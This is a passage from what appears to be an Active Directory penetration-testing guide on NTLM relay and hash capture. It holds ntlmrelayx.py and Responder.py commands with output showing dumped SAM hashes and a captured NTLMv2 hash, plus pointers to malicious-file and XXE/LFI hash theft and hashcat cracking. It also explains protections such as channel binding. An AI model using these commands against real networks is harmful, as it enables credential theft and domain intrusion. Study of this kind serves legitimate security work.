   |  SMB SIGN_REQUIRED = 0   |  SMB SIGN_REQUIRED = 0   |
   |                          |                          |
   |                          |                          |
   |                          |                     -----|--.
   |   NEGOTIATE SIGN=1       |     NEGOTIATE SIGN=1     |  |
   | -------------------->    | -----------------------> |  |
   |                          |                          |  |
   |                          |                          |  |
   |   CHALLENGE SIGN=1       |     CHALLENGE SIGN=1     |  |> NTLM Relay
   | <--------------------    | <----------------------- |  |
   |                          |                          |  |
   |                          |                          |  | 
   |  AUTHENTICATE SIGN=1     |   AUTHENTICATE SIGN=1    |  |
   | -------------------->    | -----------------------> | -|---> MIC OK!!
   |                          |                     -----|--'
   |                          |           ||             |
   |                          |           vv             |
   |                          | client SIGN_REQUIRED = 0 |
   |                          | server SIGN_REQUIRED = 0 |
   |                          |           ||             |
   |                          |           vv             |
   |                          |  Signing NOT required    |
   |                          |   Successful Attack!!    |
   |                          |                          |
   |                          |       application        |
   |                          |        messages          |
   |                          | -----------------------> |
   |                          |                          |
   |                          | <----------------------- |
   |                          |                          |
   |                          | -----------------------> |
   |                          |                          |
```

```bash
# NTLM Relay SMB2 to SMB2 with ntlmrelayx.py:
ntlmrelayx.py -t 192.168.100.10 -smb2support --no-http-server
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client MSSQL loaded..
/usr/lib/python3/dist-packages/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.3) or chardet (3.0.4) doesn't match a supported version!
  RequestsDependencyWarning)
[*] Running in relay mode to single host
[*] Setting up SMB Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-2: Connection from CONTOSO/ANAKIN@192.168.100.7 controlled, attacking target smb://192.168.100.10
[*] Authenticating against smb://192.168.100.10 as CONTOSO/ANAKIN SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb471eae0e93128b9c8d5780c19ac9f1d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6535b87abdb112a8fc3bf92528ac01f6:::
user:1001:aad3b435b51404eeaad3b435b51404ee:57d583aa46d571502aad4bb7aea09c70:::
srvuser:1005:aad3b435b51404eeaad3b435b51404ee:38db3f2d2842051c8b7c01d56da283dd:::
[*] Done dumping SAM hashes for host: 192.168.100.10
[*] Stopping service RemoteRegistry
```

Another protocol that can use NTLM is HTTP (LINK TO HTTP), but by default signing it is not used. So HTTP can be used for an cross-protocol relay attack for LDAP or SMB.

```bash
# Cross-protocol NTLM Relay from HTTP to LDAP:
   client <-----HTTP----> attacker <----LDAP----> server
      |                       |                      |
      |                       |                 -----|--.
      |     NEGOTIATE SIGN=0  |  NEGOTIATE SIGN=0    |  |
      | --------------------> | -------------------> |  |
      |                       |                      |  |
      |     CHALLENGE SIGN=1  |  CHALLENGE SIGN=1    |  |> NTLM Relay
      | <-------------------- | <------------------- |  |
      |                       |                      |  | 
      |  AUTHENTICATE SIGN=0  | AUTHENTICATE SIGN=0  |  |
      | --------------------> | -------------------> | -|---> MIC OK!! 
      |                       |                 -----|--'
      |                       |         ||           |
      |                       |         vv           |
      |                       |    client SIGN = 0   |
      |                       |    server SIGN = 1   |
      |                       |         ||           |
      |                       |         vv           |
      |                       | Signing NOT required |
      |                       |  Successful Attack!! |
      |                       |                      |
      |                       |    application       |
      |                       |     messages         |
      |                       | -------------------> |
      |                       |                      |
      |                       | <------------------- |
      |                       |                      |
      |                       | -------------------> |
      |                       |                      |
```

As you can see, since the client doesn't specify that signing is enabled, LDAP signing is not required. This scenario was used to exploit the [PrivExchange](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/) vulnerability. Relaying to LDAP is very useful since you could use to alter the ACLs or objects of the domain [database](../../08.-database.md), allowing you to escalate privileges in some cases (LINK TO ACL ATTACKS).

To perform NTLM relay attacks we can use the [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py) scripts, in conjuction with [Responder.py](https://github.com/lgandx/Responder) that allows to perform Person-in-The-Middle attacks. In Windows, other option is to use [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform both MiTM and relay. The limitation of this tools is that doesn't allow to perform NTLM relay attack from SMB2 to SMB2 from a Windows machine, since the port 445 is used by the system.

Apart from SMB and LDAP, there are other protocols like MS-SQL or SMTP that support NTLM and could be use for this attack.

#### **NTLM Relay Protections**

However, there are protections for cross-protocol NTLM Relay, **Channel Binding** or **EPA** (Enhanced Protection for Authentication). The idea behind Channel Binding is to add information about the application protocol to the AUTHENTICATE message of NTLM, that is protected by the MIC. Two types of bindings are introduced: **Service binding** and **TLS binding**.

[Service binding](https://en.hackndo.com/ntlm-relay/#service-binding) consists of the client indicating the [service SPN](../../07.-services.md) in [AvPairs](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e) of the AUTHENTICATE message (that are protected by the NTLMv2 hash), so the server can check if the NTLM request was meant for it. For example, if a client indicates that the NTLM request is for an LDAP service, and the server that receives it handles SMB (since there is an attacker in the middle), it will reject the authentication. Moreover, the SPN also indicates the address of the server, so if it is relayed to a different server, the authentication will be rejected.

On the other hand, in [TLS binding](https://en.hackndo.com/ntlm-relay/#tls-binding) the client calculates a hash, known as CBT (Channel Binding Token), with the session key of the server certificate, that it is used to create a TLS channel. If there an attacker performing a MiTM attack, then the certificate provided by the attacker (it needs to create a new certificate to decrypt/encrypt TLS traffic) will be different from that of the original server. Thus, the server will check the CBT generated by the client and if it doesn't match with the hash of its own certificate, it will reject the authentication.

Same as for the signing, the application of the Channel Binding depends on the application protocol. The updated clients of [SMB](https://support.microsoft.com/en-us/help/2345886/description-of-the-update-that-implements-extended-protection-for-auth#section-3) and [LDAP](https://support.microsoft.com/en-us/help/4034879/how-to-add-the-ldapenforcechannelbinding-registry-entry) should use Channel binding, however the servers don't seem to check it.

### **NTLM hashes cracking**

Notwithstanding, even in the case of being unable to performing relay attacks, it is stil possible to [grab the NTLM hashes](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html) by performing a Person-in-The-Middle attack and then crack them. You can use tools like [Responder.py](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform a PiTM attack.

```bash
# NTLM hashes capture with Responder.py:
./Responder.py -I enp7s0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [OFF]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [OFF]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [enp7s0]
    Responder IP               [192.168.100.137]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[!] Error starting TCP server on port 80, check permissions or other servers running.
[+] Listening for events...
[*] [LLMNR]  Poisoned answer sent to 192.168.100.7 for name fake-pc
[*] [LLMNR]  Poisoned answer sent to 192.168.100.7 for name fake-pc
[SMB] NTLMv2-SSP Client   : 192.168.100.7
[SMB] NTLMv2-SSP Username : CONTOSO\anakin
[SMB] NTLMv2-SSP Hash     : anakin::CONTOSO:9ec132434bd81f13:77E13480A5BE1935B832EE3E698C2424:0101000000000000C0653150DE09D2017C322564C9ADBF6D000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000EE905EC8AAB434C41EE46C38DB764C06DF037FE97986A0CE2A7B6D7043FA4C900A001000000000000000000000000000000000000900180063006900660073002F00660061006B0065002D00700063000000000000000000
```

Another known possibility to retrieve NTLM hashes is to [craft malicious files](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes) that establish connections with your server when they are open. You can use [ntlm\_theft](https://github.com/Greenwolf/ntlm\_theft) in order to create files to recolect NTLM hashes.

Additionally, you can use vulnerabilities in web services like [XXE or LFI](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) to grab NTLM hashes, by forcing connections to your controlled machine. Some times is even possible to grab NTLM hashes across the internet.

Finally, you can crack the NTLM hashes with [hashcat](https://hashcat.net/hashcat/). The NTLM hashes (or Net-NTLM hashes) are created by using the NT hash of the client account (and public information contained in the AUTHENTICATE message). The NTLMv1 hashes are faster to crack than NTLMv2 hashes since they are created with weaker algorithms.
